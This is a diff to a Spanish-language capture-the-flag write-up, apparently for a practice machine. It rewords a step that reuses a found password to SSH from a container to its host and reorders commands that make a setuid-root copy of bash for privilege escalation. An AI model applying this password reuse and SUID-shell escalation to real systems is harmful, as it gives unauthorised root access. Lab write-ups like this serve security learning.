@@ -211,7 +211,7 @@ cat user.txt
 
 #### Ahora necesitamos movernos dentro del servidor y pasar fuera del contenedor hacia la máquina local. 
 
-##### Como vimos antes, la contraseña ya se utilizó más de una vez y quizás fuera del contenedor también exista un usuario "augustus", por lo que procedemos a intentar conectarnos por SSH desde nuestro host (172.19.0.2) hacia el host 172.19.0.1:
+##### Como vimos antes, la contraseña ya se utilizó más de una vez y quizás fuera del contenedor. También puede que exista un usuario "augustus" en la máquina local, por lo que procedemos a intentar conectarnos por SSH desde nuestro host (172.19.0.2) hacia el host 172.19.0.1:
 
 ```bash
 ssh augustus@172.19.0.1
@@ -249,10 +249,10 @@ augustus@172.19.0.1's password: superadministrator
 - Volvemos al contenedor y modificamos los permisos:
 
 ```bash
-root@3a453ab39d3d:/home/augustus# chmod 4755 bash
-chmod 4755 bash
 root@3a453ab39d3d:/home/augustus# chown root:root bash
 chown root:root bash
+root@3a453ab39d3d:/home/augustus# chmod 4755 bash
+chmod 4755 bash
 root@3a453ab39d3d:/home/augustus# ls
 ls
 bash  user.txt
